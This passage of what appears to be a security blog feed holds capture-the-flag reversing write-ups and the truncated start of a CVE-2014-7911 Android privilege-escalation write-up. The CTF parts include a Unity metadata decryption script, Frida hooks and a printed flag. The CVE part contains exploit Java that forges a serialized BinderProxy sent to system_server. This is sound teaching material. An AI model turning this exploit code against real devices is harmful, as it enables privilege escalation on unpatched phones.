class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_3B9D4</span><span class="params">(__int64 result)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// x8</span></span><br><span class="line">  __int64 v2; <span class="comment">// x10</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// w11</span></span><br><span class="line">  __int64 v4; <span class="comment">// x11</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// w10</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// w12</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// w14</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [xsp+Ch] [xbp-4h]</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">3LL</span>;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    v3 = <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)&amp;v8 + v2) = (*(_DWORD *)(result + <span class="number">4</span> * i) &gt;&gt; v3) ^ v2;</span><br><span class="line">      --v2;</span><br><span class="line">      v3 -= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v2 &gt;= <span class="number">0</span> );</span><br><span class="line">    HIBYTE(v8) ^= <span class="number">0x86</span>u;</span><br><span class="line">    BYTE2(v8) -= <span class="number">94</span>;</span><br><span class="line">    v4 = <span class="number">3LL</span>;</span><br><span class="line">    BYTE1(v8) ^= <span class="number">0xD3</span>u;</span><br><span class="line">    LOBYTE(v8) = v8 - <span class="number">28</span>;</span><br><span class="line">    *(_DWORD *)(result + <span class="number">4</span> * i) = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    v6 = <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *((_BYTE *)&amp;v8 + v4) - v6;</span><br><span class="line">      *((_BYTE *)&amp;v8 + v4--) = v7;</span><br><span class="line">      v5 += v7 &lt;&lt; v6;</span><br><span class="line">      *(_DWORD *)(result + <span class="number">4</span> * i) = v5;</span><br><span class="line">      v6 -= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 &gt;= <span class="number">0</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>if its occured <code>HIBYTE</code> , <code>BYTE2</code>, <code>BYTE1</code>,<code>LOBYTE</code> is represent as following,Assume there is <code>a1=0x12345678</code>, well:</p><table><thead><tr><th>Symbol</th><th>Value</th></tr></thead><tbody><tr><td>HIBYTE(a1)</td><td>0x12</td></tr><tr><td>BYTE2(a1)</td><td>0x34</td></tr><tr><td>BYTE1(a1)</td><td>0x56</td></tr><tr><td>LOBYTE(a1)</td><td>0x78</td></tr></tbody></table><p>Then bswap32(v6) here is a byte flip of v6, and v6 &#x3D; HIDWORD(a1), so after performing the first encryption function sub_3B9D4, the high 32 bits of the input will be encrypted first.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">algorithm_1 = &#123;</span><br><span class="line">    (<span class="number">0</span>, <span class="string">&quot;dec&quot;</span>): lambda x: (x + <span class="number">28</span>) &amp; <span class="number">0xff</span>,</span><br><span class="line">    (<span class="number">1</span>, <span class="string">&quot;dec&quot;</span>): lambda x: x ^ <span class="number">0xd3</span>,</span><br><span class="line">    (<span class="number">2</span>, <span class="string">&quot;dec&quot;</span>): lambda x: (x + <span class="number">94</span>) &amp; <span class="number">0xff</span>,</span><br><span class="line">    (<span class="number">3</span>, <span class="string">&quot;dec&quot;</span>): lambda x: x ^ <span class="number">0x86</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">def dec_1(input):</span><br><span class="line">    input_byte = bytearray(input.to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> i in range(len(input_byte)):</span><br><span class="line">        index = i % <span class="number">4</span></span><br><span class="line">        input_byte[i] = (algorithm_1[(index, <span class="string">&quot;dec&quot;</span>)]((input_byte[i] + <span class="number">8</span> * index) &amp; <span class="number">0xff</span>)) ^ index</span><br><span class="line">    <span class="keyword">return</span> <span class="type">int</span>.from_bytes(input_byte, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">input = ()  </span><br><span class="line">input = dec_1(input)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>we change 1480 pointer type to JNIEnv * and hook jni function <code>GetStaticMethodID</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hook GetStaticMethodID</span></span><br><span class="line">function <span class="title function_">hook_GetStaticMethodID</span><span class="params">()</span> &#123;</span><br><span class="line">    var symbols = Module.enumerateSymbolsSync(<span class="string">&quot;libart.so&quot;</span>);</span><br><span class="line">    var addr_jni = null;</span><br><span class="line">    <span class="keyword">for</span> (var i = <span class="number">0</span>; i &lt; symbols.length; i++) &#123;</span><br><span class="line">        var symbol = symbols[i];</span><br><span class="line">        <span class="keyword">if</span> (symbol.name.indexOf(<span class="string">&quot;GetStaticMethodID&quot;</span>)!=<span class="number">-1</span>) &#123;</span><br><span class="line">            addr_jni = symbol.address;</span><br><span class="line">            console.<span class="built_in">log</span>(<span class="string">&quot;find &quot;</span>,symbol.name);</span><br><span class="line">            console.<span class="built_in">log</span>(<span class="string">&quot;[+] hook &quot;</span>,addr_jni);</span><br><span class="line">            Interceptor.attach(addr_jni, &#123;</span><br><span class="line">                onEnter: function (args) &#123;</span><br><span class="line">                    console.<span class="built_in">log</span>(<span class="string">&quot;call GetStaticMethodID: &quot;</span>,symbol.name);</span><br><span class="line">                    console.<span class="built_in">log</span>(<span class="string">&quot;name: &quot;</span>,args[<span class="number">2</span>].readCString());</span><br><span class="line">                    console.<span class="built_in">log</span>(<span class="string">&quot;sig: &quot;</span>,args[<span class="number">3</span>].readCString());</span><br><span class="line">                &#125;,</span><br><span class="line">                onLeave: function (retval) &#123;</span><br><span class="line">                    <span class="comment">//console.log(&quot;return val&quot;)</span></span><br><span class="line">                    <span class="comment">//console.log(retval);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2018_N1ctf_baby_unity3d</title>
      <link href="/2023/10/04/2018-N1ctf-baby-unity3d/"/>
      <url>/2023/10/04/2018-N1ctf-baby-unity3d/</url>
      
        <content type="html"><![CDATA[<p>global-metadata.bat have been encrypt，using frida search pattern memory <code>AF 1B B1 FA</code> defeat，so we google the load process of metadata to decrypt：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">il2cpp_init</span><br><span class="line">  -&gt; il2cpp::vm::Runtime::Init</span><br><span class="line">    -&gt; il2cpp::vm::MetadataCache::Initialize</span><br><span class="line">      -&gt; il2cpp::vm::MetadataLoader::LoadMetadataFile</span><br></pre></td></tr></table></figure><p><a href="http://libil2cpp.so/">libil2cpp.so</a> frist go into the il2cpp_init, we can compare with source code, generally, the metadata decrypt in LoadMetadataFile：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *__fastcall <span class="title">decrypt</span><span class="params">(<span class="type">int</span> metadate_enc, <span class="type">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// r2</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( size )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      *&amp;result[v5 &amp; <span class="number">0xFFFFFFFC</span>] = *(metadate_enc + (v5 &amp; <span class="number">0xFFFFFFFC</span>)) ^ dword_5DCF6C[(v5 + v5 / <span class="number">0x84</span>) % <span class="number">0x84</span>];</span><br><span class="line">      v5 += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 &lt; size );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>decrypt script goes here：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;global-metadata.dat&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">enc = <span class="string">&quot;&quot;</span></span><br><span class="line">enc = f.read()</span><br><span class="line">key = [<span class="number">0xF83DA249</span>, <span class="number">0x15D12772</span>, <span class="number">0x40C50697</span>, <span class="number">0x984E2B6B</span>, <span class="number">0x14EC5FF8</span>, <span class="number">0xB2E24927</span>,</span><br><span class="line">       <span class="number">0x3B8F77AE</span>, <span class="number">0x472474CD</span>, <span class="number">0x5B0CE524</span>, <span class="number">0xA17E1A31</span>, <span class="number">0x6C60852C</span>, <span class="number">0xD86AD267</span>, <span class="number">0x832612B7</span>, <span class="number">0x1CA03645</span>, <span class="number">0x5515ABC8</span>,</span><br><span class="line">       <span class="number">0xC5FEFF52</span>, <span class="number">0xFFFFAC00</span>, <span class="number">0x0FE95CB6</span>, <span class="number">0x79CF43DD</span>, <span class="number">0xAA48A3FB</span>, <span class="number">0xE1D71788</span>, <span class="number">0x97663D3A</span>, <span class="number">0xF5CFFEA7</span>, <span class="number">0xEE617632</span>,</span><br><span class="line">       <span class="number">0x4B11A7EE</span>, <span class="number">0x040EF0B5</span>, <span class="number">0x0606FC00</span>, <span class="number">0xC1530FAE</span>, <span class="number">0x7A827441</span>, <span class="number">0xFCE91D44</span>, <span class="number">0x8C4CC1B1</span>, <span class="number">0x7294C28D</span>, <span class="number">0x8D976162</span>,</span><br><span class="line">       <span class="number">0x8315435A</span>, <span class="number">0x3917A408</span>, <span class="number">0xAF7F1327</span>, <span class="number">0xD4BFAED7</span>, <span class="number">0x80D0ABFC</span>, <span class="number">0x63923DC3</span>, <span class="number">0xB0E6B35A</span>, <span class="number">0xB815088F</span>, <span class="number">0x9BACF123</span>,</span><br><span class="line">       <span class="number">0xE32411C3</span>, <span class="number">0xA026100B</span>, <span class="number">0xBCF2FF58</span>, <span class="number">0x641C5CFC</span>, <span class="number">0xC4A2D7DC</span>, <span class="number">0x99E05DCA</span>, <span class="number">0x9DC699F7</span>, <span class="number">0xB76A8621</span>, <span class="number">0x8E40E03C</span>,</span><br><span class="line">       <span class="number">0x28F3C2D4</span>, <span class="number">0x40F91223</span>, <span class="number">0x67A952E0</span>, <span class="number">0x505F3621</span>, <span class="number">0xBAF13D33</span>, <span class="number">0xA75B61CC</span>, <span class="number">0xAB6AEF54</span>, <span class="number">0xC4DFB60D</span>, <span class="number">0xD29D873A</span>,</span><br><span class="line">       <span class="number">0x57A77146</span>, <span class="number">0x393F86B8</span>, <span class="number">0x2A734A54</span>, <span class="number">0x31A56AF6</span>, <span class="number">0x0C5D9160</span>, <span class="number">0xAF83A19A</span>, <span class="number">0x7FC9B41F</span>, <span class="number">0xD079EF47</span>, <span class="number">0xE3295281</span>,</span><br><span class="line">       <span class="number">0x5602E3E5</span>, <span class="number">0xAB915E69</span>, <span class="number">0x225A1992</span>, <span class="number">0xA387F6B2</span>, <span class="number">0x7E981613</span>, <span class="number">0xFC6CF59A</span>, <span class="number">0xD34A7378</span>, <span class="number">0xB608B7D6</span>, <span class="number">0xA9EB93D9</span>,</span><br><span class="line">       <span class="number">0x26DDB218</span>, <span class="number">0x65F33F5F</span>, <span class="number">0xF9314442</span>, <span class="number">0x5D5C0599</span>, <span class="number">0xEA72E774</span>, <span class="number">0x1605A502</span>, <span class="number">0xEC6CBC9F</span>, <span class="number">0x7F8A1BD1</span>, <span class="number">0x4DD8CF07</span>,</span><br><span class="line">       <span class="number">0x2E6D79E0</span>, <span class="number">0x6990418F</span>, <span class="number">0xCF77BAD9</span>, <span class="number">0xD4FE0147</span>, <span class="number">0xFEF4A3E8</span>, <span class="number">0x85C45BDE</span>, <span class="number">0xB58F8E67</span>, <span class="number">0xA63EB8D7</span>, <span class="number">0xC69BD19B</span>,</span><br><span class="line">       <span class="number">0xDA442DCA</span>, <span class="number">0x3C0C1743</span>, <span class="number">0xE6F39D49</span>, <span class="number">0x33568804</span>, <span class="number">0x85EB6320</span>, <span class="number">0xDA223445</span>, <span class="number">0x36C4A941</span>, <span class="number">0xA9185589</span>, <span class="number">0x71B22D67</span>,</span><br><span class="line">       <span class="number">0xF59A2647</span>, <span class="number">0x3C8B583E</span>, <span class="number">0xD7717DED</span>, <span class="number">0xDF05699C</span>, <span class="number">0x4378367D</span>, <span class="number">0x1C459339</span>, <span class="number">0x85133B7F</span>, <span class="number">0x49800CE2</span>, <span class="number">0x3666CA0D</span>,</span><br><span class="line">       <span class="number">0xAF7AB504</span>, <span class="number">0x4FF5B8F1</span>, <span class="number">0xC23772E3</span>, <span class="number">0x3544F31E</span>, <span class="number">0x0F673A57</span>, <span class="number">0xF40600E1</span>, <span class="number">0x7E967417</span>, <span class="number">0x15A26203</span>, <span class="number">0x5F2E34CE</span>,</span><br><span class="line">       <span class="number">0x70C7921A</span>, <span class="number">0xD1C190DF</span>, <span class="number">0x5BB5DA6B</span>, <span class="number">0x60979C75</span>, <span class="number">0x4EA758A4</span>, <span class="number">0x078FE359</span>, <span class="number">0x1664639C</span>, <span class="number">0xAE14E73B</span>, <span class="number">0x2070FF03</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;decrypt&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; <span class="built_in">len</span>(enc):</span><br><span class="line">        num = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, enc[n:n + <span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">        num = num ^ key[(n + n // <span class="number">0x84</span>) % <span class="number">0x84</span>]</span><br><span class="line">        dec = struct.pack(<span class="string">&#x27;I&#x27;</span>, num)</span><br><span class="line">        fp.write(dec)</span><br><span class="line">        n = n + <span class="number">4</span></span><br></pre></td></tr></table></figure><p>Then we must repair the magic inside the file <code>AF 1B B1 FA</code>, finally we can using Il2cppDumper dump the information of libil2cpp.sp，we find the offset of CheckFlag function showing in the dump file , it using an AES with iv to encrpt the flag :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">checkflag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> flag; <span class="comment">// r4</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !byte_69C825 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4B82BC(<span class="number">1279</span>);</span><br><span class="line">    byte_69C825 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = dword_698140;</span><br><span class="line">  <span class="keyword">if</span> ( (*(dword_698140 + <span class="number">178</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; !*(dword_698140 + <span class="number">96</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    il2cpp_runtime_class_init_0();</span><br><span class="line">    v3 = dword_698140;</span><br><span class="line">  &#125;</span><br><span class="line">  flag = aes(*(v3 + <span class="number">80</span>), a2, *(*(v3 + <span class="number">80</span>) + <span class="number">4000</span>), *(*(v3 + <span class="number">80</span>) + <span class="number">2364</span>));<span class="comment">//0x518b54</span></span><br><span class="line">  <span class="keyword">if</span> ( (*(dword_696FB8 + <span class="number">178</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; !*(dword_696FB8 + <span class="number">96</span>) )</span><br><span class="line">    il2cpp_runtime_class_init_0();</span><br><span class="line">  <span class="keyword">return</span> sub_7D644(<span class="number">0</span>, flag, dword_69B7F0, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>using frida hook the AES function to print the arguments and decrpt it :</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> soAdrr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libil2cpp.so&quot;</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">var</span> ptrAESEncrypt = soAdrr.<span class="title function_">add</span>(<span class="number">0x518b54</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(ptrAESEncrypt,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>((<span class="string">&quot;enter ptrAESEncrypt args[0]-&gt; &quot;</span> + args[<span class="number">0</span>]));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>((<span class="string">&quot;enter ptrAESEncrypt args[1] text-&gt;\n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">1</span>])));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>((<span class="string">&quot;enter ptrAESEncrypt args[2]-&gt; password\n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">2</span>],&#123;</span><br><span class="line">                <span class="attr">offset</span>: <span class="number">12</span>,</span><br><span class="line">                <span class="attr">length</span>: <span class="number">12</span>+<span class="number">16</span> * <span class="number">2</span></span><br><span class="line">            &#125;)));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>((<span class="string">&quot;enter ptrAESEncrypt args[3]-&gt; iv\n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">3</span>],&#123;</span><br><span class="line">                <span class="attr">offset</span>: <span class="number">12</span>,</span><br><span class="line">                <span class="attr">length</span>: <span class="number">12</span>+<span class="number">16</span> * <span class="number">2</span></span><br><span class="line">            &#125;)));</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>N1CTF{h4ppy_W1TH_1l2cpp}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2014-7911:Android &lt;5.0 Privilege Escalation using ObjectInputStream</title>
      <link href="/2023/06/29/CVE-2014-7911-Android-5-0-Privilege-Escalation-using-ObjectInputStream/"/>
      <url>/2023/06/29/CVE-2014-7911-Android-5-0-Privilege-Escalation-using-ObjectInputStream/</url>
      
        <content type="html"><![CDATA[<p>java.io.ObjectInputStream没有检查要反序列化的对象是否真的可以序列化，因此可以构建一个不可序列化的java对象实例，恶意构建其成员变量，当该对象实例被ObjectInputStream反序列化时，将发生类型混淆，对象的Field被视为由本地代码处理的指针，构造恶意的对象可在sysem_server进程中执行任意代码并获取提升的权限。其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。</p><p>binder service实际上并没有单独的进程，它们只是systemserver的一个子线程。init进程会启动surface flinger、media server、drmserver等服务，在这些服务里会创建binder service，并注册到service manager。native binder service 和 java 层的binder service，都会交由service manager注册，然后由service manager管理。客户端使用binder service时需要向service manager查询得到binder service在当前进程的一个代理proxy，通过代理与binder service的服务端交互。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//构建可序列化恶意对象</span></span><br><span class="line"><span class="type">Bundle</span> <span class="variable">bundle</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bindle</span>();</span><br><span class="line">AAdroid.os.<span class="type">BinderProxy</span> <span class="variable">evilProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AAdroid</span>.os.BinderProxy();</span><br><span class="line">bundle.putSerializable(<span class="string">&quot;eatthis&quot;</span>, evilProxy);</span><br><span class="line"></span><br><span class="line"><span class="comment">//准备传入system_server的数据</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">stubClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">for</span>(Class inner : Class.forname(<span class="string">&quot;android.os.IUserManager&quot;</span>).getDeclaredClasses())&#123;</span><br><span class="line"><span class="comment">//获取android.os.IUserManager.Stub的class对象</span></span><br><span class="line"><span class="keyword">if</span>(inner.getCanonicalName().equals(<span class="string">&quot;android.os.IUserManager.Stub&quot;</span>))&#123;</span><br><span class="line">stubClass = inner;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Field</span> <span class="variable">TRANSACTION_setApplicationRestrictionsField</span> <span class="operator">=</span> stubClass.getDeclaredField(<span class="string">&quot;TRANSACTION_setApplicationRestrictions&quot;</span>)</span><br><span class="line">TRANSACTION_setApplicationRestrictionsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">TRANSACTION_setApplicationRestrictions = TRANSACTION_setApplicationRestrictionsField.getInt(<span class="literal">null</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">proxyClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">for</span>(Class inner : stubClass.getDeclaredClasses())&#123;</span><br><span class="line"><span class="keyword">if</span>(inner.getCanonicalName().equals(<span class="string">&quot;android.os.IUserManager.Stub.Proxy&quot;</span>))&#123;</span><br><span class="line">proxyClass = inner;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">UserManager</span> <span class="variable">userManager</span> <span class="operator">=</span> (UserManager)context.getSystemService(Context.USER_SERVICE);</span><br><span class="line"><span class="type">Field</span> <span class="variable">mServiceField</span> <span class="operator">=</span> UserManger.class.getDeclaredField(<span class="string">&quot;mService&quot;</span>);</span><br><span class="line">mServiceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">mService</span> <span class="operator">=</span> mServiceField.get(userManager);</span><br><span class="line"><span class="comment">//获得跨进程调用system_server的IBinder接口mRemote</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">mRemoteField</span> <span class="operator">=</span> proxyClass.getDeclaredField(<span class="string">&quot;mRemote&quot;</span>);</span><br><span class="line">mRemote = (IBinder) mRemoteField.get(mService);</span><br><span class="line"><span class="type">UserHandle</span> <span class="variable">userHandle</span> <span class="operator">=</span> android.os.Process.myUserHandle();</span><br><span class="line">setApplicationRestrictions(context.getPackageName(), bundle, userHandle.hashCode());</span><br><span class="line"></span><br><span class="line"><span class="comment">//向system_server传入不可序列化的Bundle参数</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setApplicationRestrictions</span><span class="params">(java.lang.String packageName, android.os.Bundle restrictions, <span class="type">int</span> userHandle)</span> <span class="keyword">throws</span> android.os.RemoteException &#123;</span><br><span class="line">android.os.<span class="type">Parcel</span> <span class="variable">_data</span> <span class="operator">=</span> android.os.Parcel.obtain();</span><br><span class="line">android.os.<span class="type">Parcel</span> <span class="variable">_reply</span> <span class="operator">=</span> android.os.Parcel.obtain();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   _data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">   _data.writeString(packageName);</span><br><span class="line">   _data.writeInt(<span class="number">1</span>);</span><br><span class="line">   restrictions.writeToParcel(_data, <span class="number">0</span>);</span><br><span class="line">   _data.writeInt(userHandle);</span><br><span class="line">   <span class="type">byte</span>[] data = _data.marshall();<span class="comment">// 序列化，获得一个byte[]数组</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; <span class="literal">true</span>; i++) &#123;</span><br><span class="line"><span class="comment">//篡改了序列化字节中的类名，从而再反序列化时得到了原本不可序列化的BinderProxy</span></span><br><span class="line"><span class="comment">// 将这个数组中的”AAdr”修改成”andr”，要传输的对象的类型是AAdroid.os.BinderProxy，所以这里相当于把对象类型修改成了android.os.BinderProxy，这样就成功发送了恶意的对象</span></span><br><span class="line">       <span class="keyword">if</span> (data[i] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; data[i+<span 